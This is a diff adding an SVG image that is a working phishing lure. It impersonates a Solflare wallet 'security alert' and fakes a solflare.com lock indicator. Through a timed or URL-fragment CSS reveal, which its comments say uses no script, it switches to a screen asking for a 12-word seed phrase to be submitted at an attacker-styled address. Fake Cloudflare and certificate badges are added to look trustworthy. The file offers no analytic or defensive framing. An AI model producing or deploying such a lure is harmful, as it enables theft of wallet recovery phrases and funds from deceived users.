@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg width="600" height="400" xmlns="http://www.w3.org/2000/svg">
+<style>
+/* Default: show alert, hide phish */
+.alert-view { opacity: 1; display: inline; }
+.phish-view  { opacity: 0; display: none; }
+
+/* CSS :target trigger — activated by URL fragment #phish */
+/* No SMIL, no JS — pure CSS fragment-based reveal */
+#phish:target .phish-view { opacity: 1; display: inline; }
+#phish:target .alert-view { opacity: 0; display: none; }
+
+/* Fallback: CSS @keyframes auto-reveal after 4s (no :target needed) */
+@keyframes showAlert {
+  0%,80%  { opacity: 1; }
+  81%,100% { opacity: 0; }
+}
+@keyframes showPhish {
+  0%,80% { opacity: 0; }
+  81%,100% { opacity: 1; }
+}
+.alert-view { animation: showAlert 5s 1s forwards; }
+.phish-view  { animation: showPhish 5s 1s forwards; }
+
+/* Visual styles */
+rect.bg   { fill: #0f0f1a; }
+rect.card { fill: #1a1a2e; rx: 16; }
+rect.btn  { fill: #ff6b35; cursor: pointer; }
+.title    { font: bold 22px sans-serif; fill: #ffffff; }
+.sub      { font: 14px sans-serif; fill: #aaaacc; }
+.warn     { font: bold 15px sans-serif; fill: #ff9900; }
+.url-box  { fill: #0d1117; }
+.url-text { font: bold 15px 'Courier New',monospace; fill: #58a6ff; }
+.trust    { font: 11px sans-serif; fill: #3fb950; }
+.badge    { font: 10px sans-serif; fill: #ffffff; }
+.domain   { font: bold 12px sans-serif; fill: #4ade80; }
+</style>
+
+<!-- Root group, :target activates when URL = ...svg#phish -->
+<g id="phish">
+  <rect class="bg" width="600" height="400"/>
+
+  <!-- === ALERT VIEW (default) === -->
+  <g class="alert-view">
+    <rect class="card" x="50" y="30" width="500" height="340" rx="16"/>
+    <!-- Solflare-styled warning header -->
+    <rect x="50" y="30" width="500" height="60" rx="16" fill="#2a1f00"/>
+    <text class="warn" x="300" y="68" text-anchor="middle">⚠  SOLFLARE SECURITY ALERT</text>
+    <!-- Body -->
+    <text class="title" x="300" y="130" text-anchor="middle">Wallet Activity Detected</text>
+    <text class="sub" x="300" y="158" text-anchor="middle">Unusual sign-in attempt blocked.</text>
+    <text class="sub" x="300" y="178" text-anchor="middle">Verify your identity to restore access.</text>
+    <!-- Domain trust indicator -->
+    <rect x="140" y="200" width="320" height="36" rx="8" fill="#0d1117"/>
+    <text class="domain" x="300" y="223" text-anchor="middle">🔒 www.solflare.com</text>
+    <!-- Timer text (CSS animation replaces it) -->
+    <text class="sub" x="300" y="270" text-anchor="middle">Redirecting in 4 seconds...</text>
+    <!-- Button -->
+    <rect class="btn" x="175" y="300" width="250" height="50" rx="10"/>
+    <text class="title" x="300" y="332" text-anchor="middle" font-size="16">Verify Now →</text>
+  </g>
+
+  <!-- === PHISH VIEW (revealed after timer OR via #phish fragment) === -->
+  <g class="phish-view">
+    <rect class="bg" width="600" height="400"/>
+    <rect class="card" x="50" y="20" width="500" height="360" rx="16"/>
+    <text class="title" x="300" y="70" text-anchor="middle">Verify Your Recovery Phrase</text>
+    <text class="sub" x="300" y="100" text-anchor="middle">Enter your 12-word seed phrase below</text>
+    <text class="sub" x="300" y="118" text-anchor="middle">to complete identity verification.</text>
+    <!-- Fake input row visual (CSS-drawn, no HTML input) -->
+    <rect class="url-box" x="80" y="135" width="440" height="34" rx="6"/>
+    <text class="url-text" x="300" y="157" text-anchor="middle">word1  word2  word3  word4</text>
+    <rect class="url-box" x="80" y="178" width="440" height="34" rx="6"/>
+    <text class="url-text" x="300" y="200" text-anchor="middle">word5  word6  word7  word8</text>
+    <rect class="url-box" x="80" y="220" width="440" height="34" rx="6"/>
+    <text class="url-text" x="300" y="242" text-anchor="middle">word9  word10  word11  word12</text>
+    <!-- Submit URL -->
+    <text class="sub" x="300" y="275" text-anchor="middle">Submit at:</text>
+    <text class="url-text" x="300" y="298" text-anchor="middle" font-size="13">theexploit.store/solflare/verify</text>
+    <!-- Trust badges -->
+    <rect x="80" y="320" width="440" height="48" rx="8" fill="#0a1f0a"/>
+    <text class="trust" x="300" y="342" text-anchor="middle">✓ Secured by Cloudflare · ✓ www.solflare.com</text>
+    <text class="trust" x="300" y="360" text-anchor="middle" font-size="10">Certificate valid · Session encrypted</text>
+  </g>
+</g>
+</svg>
